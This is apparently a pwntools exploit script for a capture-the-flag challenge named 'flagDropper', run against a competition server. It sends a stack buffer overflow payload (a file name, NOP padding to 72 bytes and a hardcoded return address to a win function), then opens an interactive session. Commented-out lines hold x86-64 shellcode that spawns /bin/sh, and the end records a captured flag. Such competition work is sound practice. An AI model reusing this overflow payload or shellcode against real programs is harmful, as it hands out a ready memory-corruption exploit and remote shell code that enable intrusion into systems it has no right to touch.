from pwn import *
binf = ELF("flagDropper")
libc = ELF.libc
#p = remote("chall.ctf.bamboofox.tw", 10102)
# p=process('flagDropper')
p=remote("dropper.sdc.tf",1337)
gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return remote("dropper.sdc.tf",1337)

context.log_level = "DEBUG"
context.aslr = False
print(binf.plt)

# pwndbg> search "CCCCCCCC"
# flagDropper     0x6010a4 0x4343434343434343 ('CCCCCCCC')

# fopen=p64(binf.plt['fopen'])
win=p64(0x04005da)



shell=""
shell=b"flag.txt"
# shell="\xde\xad\xbe\xef"
# shell="\xde\xad\xbe\xef"
# shell=shell+"\x48\x31\xd2"                                 # // xor    %rdx, %rdx
# shell=shell+"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" #     // mov	$0x68732f6e69622f2f, %rbx
# shell=shell+"\x48\xc1\xeb\x08"                         #     // shr    $0x8, %rbx
# shell=shell+"\x53"                                     #     // push   %rbx
# shell=shell+"\x48\x89\xe7"                             #     // mov    %rsp, %rdi
# shell=shell+"\x50"                                     #     // push   %rax
# shell=shell+"\x57"                                     #     // push   %rdi
# shell=shell+"\x48\x89\xe6"                             #     // mov    %rsp, %rsi
# shell=shell+"\xb0\x3b"                                 #     // mov    $0x3b, %al
# shell=shell+"\x0f\x05"

# shell=shell+"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
# shell=shell+"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
# shell=shell+"\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

p=start()
# shell="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
g = cyclic_gen()
# pause()
p.sendafter('CATCH\nf',shell+b'\x90'*(72-len(shell))+win)
p.interactive()
# dctf{n1C3_C4tcH_bUd}